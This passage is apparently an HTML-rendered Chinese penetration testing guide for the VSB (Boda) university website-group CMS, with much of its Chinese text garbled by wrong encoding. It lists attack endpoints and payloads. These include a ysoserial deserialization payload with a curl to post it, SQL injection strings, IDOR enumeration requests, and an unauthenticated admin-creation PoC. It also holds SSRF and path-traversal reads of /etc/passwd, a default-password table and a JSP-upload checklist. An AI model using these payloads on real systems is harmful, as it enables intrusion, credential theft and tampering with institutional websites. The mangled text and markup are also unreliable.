+<h3 id="3-3-鍙嶅簭鍒楀寲-鈫-RCE"><a href="#3-3-鍙嶅簭鍒楀寲-鈫-RCE" class="headerlink" title="3.3 鍙嶅簭鍒楀寲 鈫?RCE"></a>3.3 鍙嶅簭鍒楀寲 鈫?RCE</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮 鈥?褰卞搷闈㈠箍</p>
+<p>鍗氳揪鍩轰簬 Java 鎶€鏈爤锛屽鏋滅郴缁熶娇鐢ㄤ簡 Java 鍘熺敓搴忓垪鍖栧崗璁紙RMI&#x2F;Hessian&#x2F;Spring 鍗忚锛夛紝涓?API 鏈壌鏉冿紝鍙Е鍙戝弽搴忓垪鍖?RCE銆?</p>
+<h4 id="妫€娴嬪叆鍙-1"><a href="#妫€娴嬪叆鍙-1" class="headerlink" title="妫€娴嬪叆鍙?"></a>妫€娴嬪叆鍙?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /services/xxx  锛圵ebService 绔偣锛?POST /vsb/rmi</span><br><span class="line">POST /api/invoke</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤鎬濊矾-1"><a href="#鍒╃敤鎬濊矾-1" class="headerlink" title="鍒╃敤鎬濊矾"></a>鍒╃敤鎬濊矾</h4><p>浣跨敤 <code>ysoserial</code> 鐢熸垚 Payload锛?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浣跨敤 ysoserial 妫€娴?java -jar ysoserial.jar CommonsCollections5 &quot;whoami&quot; &gt; payload.bin</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://target.com/services/xxx&quot;</span> --data-binary @payload.bin</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-4-浠绘剰鍛戒护鎵ц"><a href="#3-4-浠绘剰鍛戒护鎵ц" class="headerlink" title="3.4 浠绘剰鍛戒护鎵ц"></a>3.4 浠绘剰鍛戒护鎵ц</h3><p><strong>椋庨櫓</strong>锛氣瓙 鏋侀珮</p>
+<p>鑻?API 绔偣鐩存帴璋冪敤 <code>Runtime.exec()</code> 鎴栬剼鏈紩鎿庢墽琛岀敤鎴疯緭鍏ワ紝涓旀湭閴存潈锛屽彲鐩存帴 RCE銆?</p>
+<h4 id="甯歌瑙﹀彂鐐"><a href="#甯歌瑙﹀彂鐐" class="headerlink" title="甯歌瑙﹀彂鐐?"></a>甯歌瑙﹀彂鐐?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 鍗氳揪绯荤粺鍙兘瀛樺湪绯荤粺鍛戒护璋冪敤鎺ュ彛</span><br><span class="line">POST /api/tool/exec</span><br><span class="line">POST /vsb/command</span><br><span class="line">GET /api/util/cmd?cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛"><a href="#鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛" class="headerlink" title="鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?"></a>鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?</h2><h3 id="4-1-鏁忔劅淇℃伅娉勯湶"><a href="#4-1-鏁忔劅淇℃伅娉勯湶" class="headerlink" title="4.1 鏁忔劅淇℃伅娉勯湶"></a>4.1 鏁忔劅淇℃伅娉勯湶</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?甯稿父鏄繛閿佹敾鍑荤殑绗竴姝?<br>API 鏈巿鏉冪洿鎺ヨ繑鍥炴暟鎹簱杩炴帴淇℃伅銆佺鐞嗗憳璐﹀彿銆丅ucket 鍑嵁銆佸瘑閽ョ瓑鏁忔劅鏁版嵁銆?</p>
+<h4 id="娴嬭瘯璺緞"><a href="#娴嬭瘯璺緞" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /api/config</span><br><span class="line">GET /api/system/config</span><br><span class="line">GET /api/database</span><br><span class="line">GET /api/db/info</span><br><span class="line">GET /api/user/list</span><br><span class="line">GET /api/admin/list</span><br><span class="line">GET /api/user/info</span><br><span class="line">GET /api/site/list</span><br></pre></td></tr></table></figure>
+
+<h4 id="棰勬湡鍝嶅簲锛圝SON-鏍煎紡锛"><a href="#棰勬湡鍝嶅簲锛圝SON-鏍煎紡锛" class="headerlink" title="棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?"></a>棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;db_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:postgresql://10.x.x.x:5432/vsb9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vsbadmin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;db_pass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VSB@2020#Secure&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span> <span class="string">&quot;zhang...&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-2-姘村钩瓒婃潈锛圛DOR锛"><a href="#4-2-姘村钩瓒婃潈锛圛DOR锛" class="headerlink" title="4.2 姘村钩瓒婃潈锛圛DOR锛?"></a>4.2 姘村钩瓒婃潈锛圛DOR锛?</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?璺ㄧ珯鏁版嵁绡℃敼&#x2F;娉勯湶</p>
+<p>API 鍙獙璇佷簡鐧诲綍鐘舵€佷絾鏈獙璇佽祫婧愬綊灞烇紝閫氳繃閬嶅巻 ID 鍙搷浣滃叾浠栫珯鐐圭殑鏁版嵁銆?</p>
+<h4 id="娴嬭瘯鍦烘櫙"><a href="#娴嬭瘯鍦烘櫙" class="headerlink" title="娴嬭瘯鍦烘櫙"></a>娴嬭瘯鍦烘櫙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 姝ｅ父璇锋眰锛氭煡鐪?ID=1 鐨勬枃绔?curl &quot;http://target.com/api/article/get?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 瓒婃潈娴嬭瘯锛氶亶鍘?ID=2,3,4...</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/get?id=2&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/article/edit?id=2&amp;title=宸茬鏀?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鍗氳揪绔欑兢鐗硅壊锛歴iteId 鍙傛暟閬嶅巻</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">2</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">curl &quot;</span>http://target.com/api/article/list?siteId=<span class="number">3</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤閾"><a href="#鍒╃敤閾" class="headerlink" title="鍒╃敤閾?"></a>鍒╃敤閾?</h4><ol>
+<li>閬嶅巻 <code>siteId</code> 鈫?鍙戠幇闅愯棌绔欑偣锛堝鍐呯綉绠＄悊绔欑偣锛?2. 閬嶅巻 <code>articleId</code> 鈫?鑾峰彇鏈叕寮€鏁忔劅鏂囩珷</li>
+<li>淇敼浠栦汉鏂囩珷 鈫?妞嶅叆 XSS 鎴栨伓鎰忓唴瀹?</li>
+</ol>
+<hr>
+<h3 id="4-3-鍨傜洿瓒婃潈-浠绘剰鐢ㄦ埛娣诲姞"><a href="#4-3-鍨傜洿瓒婃潈-浠绘剰鐢ㄦ埛娣诲姞" class="headerlink" title="4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞"></a>4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鐩存帴鍒涘缓绠＄悊鍛?<br>鐢ㄦ埛绠＄悊 API 鏈牎楠岃鑹插弬鏁帮紝鏅€氭潈闄愭垨鏈櫥褰曞嵆鍙垱寤虹鐞嗗憳璐﹀彿銆?</p>
+<h4 id="娴嬭瘯璺緞-1"><a href="#娴嬭瘯璺緞-1" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/add</span><br><span class="line">POST /api/user/create</span><br><span class="line">POST /api/admin/add</span><br><span class="line">POST /vsb/user/register</span><br></pre></td></tr></table></figure>
+
+<h4 id="娴嬭瘯-PoC"><a href="#娴嬭瘯-PoC" class="headerlink" title="娴嬭瘯 PoC"></a>娴嬭瘯 PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="literal">-X</span> POST <span class="string">&quot;http://target.com/api/user/add&quot;</span> `</span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> `</span><br><span class="line">  <span class="literal">-d</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;username&quot;: &quot;hacker&quot;,</span></span><br><span class="line"><span class="string">    &quot;password&quot;: &quot;Hacker123!&quot;,</span></span><br><span class="line"><span class="string">    &quot;role&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">    &quot;email&quot;: &quot;hacker@evil.com&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-4-浠绘剰瀵嗙爜閲嶇疆"><a href="#4-4-浠绘剰瀵嗙爜閲嶇疆" class="headerlink" title="4.4 浠绘剰瀵嗙爜閲嶇疆"></a>4.4 浠绘剰瀵嗙爜閲嶇疆</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鎺ョ绠＄悊鍛樿处鍙?<br>瀵嗙爜閲嶇疆 API 浠呴渶瀛﹀彿&#x2F;宸ュ彿&#x2F;閭鍗冲彲閲嶇疆锛屾棤浜屾楠岃瘉銆?</p>
+<h4 id="娴嬭瘯璺緞-2"><a href="#娴嬭瘯璺緞-2" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/resetPassword</span><br><span class="line">POST /api/user/forgot</span><br><span class="line">POST /api/user/resetPwd</span><br><span class="line">POST /vsb/user/resetPass</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-5-SQL-娉ㄥ叆"><a href="#4-5-SQL-娉ㄥ叆" class="headerlink" title="4.5 SQL 娉ㄥ叆"></a>4.5 SQL 娉ㄥ叆</h3><p><strong>椋庨櫓</strong>锛氫腑楂樺嵄 鈥?鍙兘瀵艰嚧鍚庡彴鐧诲綍缁曡繃鎴栨暟鎹硠闇?<br>API 鍙傛暟鐩存帴鎷兼帴 SQL 璇彞锛屾湭鍋氬弬鏁板寲澶勭悊銆?</p>
+<h4 id="娴嬭瘯鍏ュ彛"><a href="#娴嬭瘯鍏ュ彛" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/site/list?siteId=1 UNION SELECT ...</span><br><span class="line">GET  /api/article/list?categoryId=1&#x27;</span><br><span class="line">POST /api/user/login?username=admin&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-6-Druid-鐩戞帶鏈巿鏉"><a href="#4-6-Druid-鐩戞帶鏈巿鏉" class="headerlink" title="4.6 Druid 鐩戞帶鏈巿鏉?"></a>4.6 Druid 鐩戞帶鏈巿鏉?</h3><p><strong>椋庨櫓</strong>锛氫腑楂?鈥?鍗氳揪绔欑兢甯歌閰嶇疆</p>
+<p>鍗氳揪绔欑兢甯搁泦鎴愰樋閲屽反宸?Druid 鏁版嵁搴撹繛鎺ユ睜銆傝嫢鏈厤缃闂潈闄愶紝鍙洿鎺ヨ闂洃鎺ч〉銆?</p>
+<h4 id="娴嬭瘯璺緞-3"><a href="#娴嬭瘯璺緞-3" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/login.html</span><br><span class="line">/druid/sql.html         鈫?鍙煡鐪?SQL 鎵ц璁板綍</span><br><span class="line">/druid/spring.html      鈫?Spring 鐩戞帶</span><br><span class="line">/druid/websession.html  鈫?Session 娉勯湶</span><br></pre></td></tr></table></figure>
+
+<h2 id="鍗卞锛氶€氳繃-Session-娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇-鈫-鑾峰彇鍚庡彴鏉冮檺銆"><a href="#鍗卞锛氶€氳繃-Session-娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇-鈫-鑾峰彇鍚庡彴鏉冮檺銆" class="headerlink" title="鍗卞锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?"></a><strong>鍗卞</strong>锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?</h2><h3 id="4-7-Swagger-API-鏂囨。娉勯湶"><a href="#4-7-Swagger-API-鏂囨。娉勯湶" class="headerlink" title="4.7 Swagger API 鏂囨。娉勯湶"></a>4.7 Swagger API 鏂囨。娉勯湶</h3><p><strong>椋庨櫓</strong>锛氫腑楂?鈥?鍏ㄩ噺 API 鎺ュ彛涓€瑙堟棤浣?<br>鑻ュ崥杈句簩娆″紑鍙戦泦鎴愪簡 Swagger 涓旀湭鍏抽棴鐢熶骇鐜灞曠ず锛屽彲鑾峰彇鍏ㄥ API 鎺ュ彛銆?</p>
+<h4 id="娴嬭瘯璺緞-4"><a href="#娴嬭瘯璺緞-4" class="headerlink" title="娴嬭瘯璺緞"></a>娴嬭瘯璺緞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/swagger-ui.html</span><br><span class="line">/swagger-ui.html#/</span><br><span class="line">/v2/api-docs</span><br><span class="line">/swagger-resources</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/api-docs</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="浜斻€佷腑鍗辨紡娲烇紙P2-P3锛"><a href="#浜斻€佷腑鍗辨紡娲烇紙P2-P3锛" class="headerlink" title="浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?"></a>浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?</h2><h3 id="5-1-SSRF锛堟湇鍔＄璇锋眰浼€狅級"><a href="#5-1-SSRF锛堟湇鍔＄璇锋眰浼€狅級" class="headerlink" title="5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級"></a>5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級</h3><p><strong>椋庨櫓</strong>锛氫腑绛?鈥?鍙帰娴嬪唴缃?<br>API 涓瓨鍦?URL 鍙傛暟锛堢珯鐐瑰鍏?杩滅▼鍙戝竷&#x2F;RSS 鎶撳彇锛夛紝鏈檺鍒跺唴缃戠洰鏍囥€?</p>
+<h4 id="娴嬭瘯鍏ュ彛-1"><a href="#娴嬭瘯鍏ュ彛-1" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/import?url=http://127.0.0.1:8080/</span><br><span class="line">POST /api/site/import?url=http://192.168.x.x:8080/</span><br><span class="line">GET  /api/rss/fetch?url=http://鍐呯綉IP:绔彛/</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤"><a href="#鍒╃敤" class="headerlink" title="鍒╃敤"></a>鍒╃敤</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鎺㈡祴鍐呯綉瀛樻椿</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://192.168.1.1:22&quot;</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/import?url=http://172.16.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍥炴樉 SSRF锛堝鏋滄敮鎸侊級</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/fetch?url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-2-鐩綍閬嶅巻-浠绘剰鏂囦欢璇诲彇"><a href="#5-2-鐩綍閬嶅巻-浠绘剰鏂囦欢璇诲彇" class="headerlink" title="5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇"></a>5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</h3><p><strong>椋庨櫓</strong>锛氫腑绛?鈥?鍙鍙栭厤缃枃浠躲€佹簮鐮?</p>
+<h4 id="娴嬭瘯鍏ュ彛-2"><a href="#娴嬭瘯鍏ュ彛-2" class="headerlink" title="娴嬭瘯鍏ュ彛"></a>娴嬭瘯鍏ュ彛</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api/download?file=../../../etc/passwd</span><br><span class="line">GET /api/file/read?path=../../../WEB-INF/web.xml</span><br><span class="line">GET /vsb/readFile?path=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍏抽敭璇诲彇鐩爣"><a href="#鍏抽敭璇诲彇鐩爣" class="headerlink" title="鍏抽敭璇诲彇鐩爣"></a>鍏抽敭璇诲彇鐩爣</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml        鈫?鏌ョ湅 Servlet 鏄犲皠鍜岄厤缃?/WEB-INF/classes/       鈫?鍙嶇紪璇戣幏鍙栨暟鎹簱閰嶇疆</span><br><span class="line">/opt/vsb9/config/*.properties  鈫?鏁版嵁搴?Redis 閰嶇疆</span><br><span class="line">/etc/passwd             鈫?Linux 璐︽埛</span><br><span class="line">/opt/vsb9/manager/WEB-INF/lib/ 鈫?鍏ㄩ噺 Jar 鍖呭垎鏋愭紡娲?```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 5.3 瀛樺偍鍨?XSS</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氫腑绛?鈥?鍙姭鎸佺鐞嗗憳浼氳瘽</span><br><span class="line"></span><br><span class="line">鍐呭鍙戝竷/璇勮/鐣欒█ API 鏈繃婊?HTML锛屾姇绋夸腑鍖呭惈鎭舵剰鑴氭湰銆?</span><br><span class="line">#### 娴嬭瘯鍏ュ彛</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST &#x2F;api&#x2F;comment&#x2F;add      鈫?鐣欒█ XSS<br>POST &#x2F;api&#x2F;article&#x2F;submit   鈫?鎶曠 XSS<br>POST &#x2F;api&#x2F;guestbook&#x2F;add    鈫?鐣欒█鏉?XSS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 5.4 寮卞彛浠?/ 榛樿鍙ｄ护</span><br><span class="line"></span><br><span class="line">**椋庨櫓**锛氫腑绛?鈥?鐩存帴鐧诲綍鍚庡彴</span><br><span class="line"></span><br><span class="line">鍗氳揪绔欑兢绯荤粺榛樿鍚庡彴璺緞甯镐负 `/vsb/admin/`锛岄儴鍒嗗鏍℃湭淇敼榛樿瀵嗙爜銆?</span><br><span class="line">#### 甯歌榛樿鍙ｄ护</span><br><span class="line"></span><br><span class="line">| 鐢ㄦ埛鍚?| 瀵嗙爜 | 璇存槑 |</span><br><span class="line">|:------|:-----|:-----|</span><br><span class="line">| admin | admin | 榛樿绠＄悊鍛?|</span><br><span class="line">| admin | admin123 | 甯歌寮卞彛浠?|</span><br><span class="line">| admin | 123456 | 甯歌寮卞彛浠?|</span><br><span class="line">| root | root | 閮ㄥ垎閮ㄧ讲 |</span><br><span class="line">| vsbadmin | vsbadmin | 绯荤粺绠＄悊 |</span><br><span class="line"></span><br><span class="line">#### 鍚庡彴璺緞鐖嗙牬</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 甯歌鍚庡彴璺緞</span><br><span class="line">/vsb/admin/</span><br><span class="line">/siteadmin/</span><br><span class="line">/vsb/manager/</span><br><span class="line">/vsb/console/</span><br><span class="line">/admin/</span><br><span class="line">/manager/</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄"><a href="#鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄" class="headerlink" title="鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?"></a>鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</h2><table>
+<thead>
+<tr>
+<th align="left">澹版槑鍐呭</th>
+<th align="left">鏉ユ簮</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">鍗氳揪缃戠珯缇ょ郴鍒椾骇鍝?*鍩轰簬 Java 寮€鍙?*锛屼絾<strong>鏈娇鐢?Struts&#x2F;Struts2 妗嗘灦</strong>锛屼笉鍙?Struts2 鐩稿叧婕忔礊褰卞搷</td>
+<td align="left">鍗氳揪瀹樼綉瀹夊叏澹版槑 <a target="_blank" rel="noopener" href="https://www.chinawebber.com/info/1302/2757.htm">$TRAE_REF</a></td>
+</tr>
+<tr>
+<td align="left">瀹樻柟鏈叕寮€鎶湶杩囧叿浣?CVE 婕忔礊缂栧彿锛堝晢涓氶棴婧愶級</td>
+<td align="left">鎼滅储寮曟搸妫€绱㈢粨鏋?</td>
+</tr>
+<tr>
+<td align="left">鍗氳揪閫氬父閫氳繃鐗堟湰杩唬淇婕忔礊锛圴SB8 鈫?VSB9 鈫?鍏ㄥ獟浣撶増锛?</td>
+<td align="left">琛屼笟鎯緥</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>铏界劧娌℃湁鍏紑鐨?CVE 鍒楄〃锛屼絾鍗氳揪浣滀负鍟嗕笟闂簮绯荤粺锛屽叾 API 閴存潈鐨勫畨鍏ㄦ€у畬鍏ㄤ緷璧栧巶鍟嗕唬鐮佽川閲忋€傚ぇ閲忛珮鏍′粛鍦ㄤ娇鐢ㄨ€佹棫鐗堟湰锛堝 VSB8銆乂SB9 鏃╂湡鐗堬級锛岃繖浜涚増鏈緢鍙兘瀛樺湪鏈慨澶嶇殑 API 鏈巿鏉冮棶棰樸€?</p>
+</blockquote>
+<hr>
+<h2 id="涓冦€佸疄鎴樻娴-Checklist"><a href="#涓冦€佸疄鎴樻娴-Checklist" class="headerlink" title="涓冦€佸疄鎴樻娴?Checklist"></a>涓冦€佸疄鎴樻娴?Checklist</h2><h3 id="Phase-0锛氭寚绾圭‘璁"><a href="#Phase-0锛氭寚绾圭‘璁" class="headerlink" title="Phase 0锛氭寚绾圭‘璁?"></a>Phase 0锛氭寚绾圭‘璁?</h3><ul>
+<li><input disabled="" type="checkbox"> 椤甸潰搴曢儴鏄惁鏈?&#96;Powered by 鍗氳揪缃戠珯缇</li>
+<li><input disabled="" type="checkbox"> HTML 涓槸鍚﹀寘鍚?<code>vsbclub</code> 鎴?<code>VSB</code></li>
+<li><input disabled="" type="checkbox"> 鏄惁瀛樺湪 <code>/vsb/admin/</code> 鍚庡彴</li>
+<li><input disabled="" type="checkbox"> 鍝嶅簲澶存槸鍚﹀寘鍚?<code>X-Powered-By: VSB</code></li>
+</ul>
+<h3 id="Phase-1锛氫俊鎭敹闆"><a href="#Phase-1锛氫俊鎭敹闆" class="headerlink" title="Phase 1锛氫俊鎭敹闆?"></a>Phase 1锛氫俊鎭敹闆?</h3><ul>
+<li><input disabled="" type="checkbox"> Swagger 鏂囨。娉勯湶妫€娴嬶細<code>/swagger-ui.html</code> <code>/v2/api-docs</code></li>
+<li><input disabled="" type="checkbox"> Druid 鐩戞帶鏈巿鏉冿細<code>/druid/index.html</code></li>
+<li><input disabled="" type="checkbox"> 鏁忔劅璺緞鐖嗙牬锛歚&#x2F;api&#x2F;<code> </code>&#x2F;vsb&#x2F;api&#x2F;<code> </code>&#x2F;cms&#x2F;api&#x2F;&#96;</li>
+<li><input disabled="" type="checkbox"> JS 鏂囦欢鍙嶇紪璇戯細鎼滅储 <code>api/</code> 鍏抽敭瀛?<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 蹇€?JS 鍙嶇紪璇戞壘 API</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/vsb/js/main.js&quot;</span> | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;api/|\.do|\.action&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Phase-2锛氭湭鎺堟潈-API-妫€娴"><a href="#Phase-2锛氭湭鎺堟潈-API-妫€娴" class="headerlink" title="Phase 2锛氭湭鎺堟潈 API 妫€娴?"></a>Phase 2锛氭湭鎺堟潈 API 妫€娴?</h3><p>*<em>P0 绾?鈥?鏂囦欢涓婁紶锛?</em></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>POST /api/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /vsb/uploadFile</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /cms/api/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /siteadmin/upload</code> 鈫?涓婁紶 JSP 娴嬭瘯</li>
+</ul>
+<p>*<em>P0 绾?鈥?妯℃澘娉ㄥ叆锛?</em></p>
+<ul>
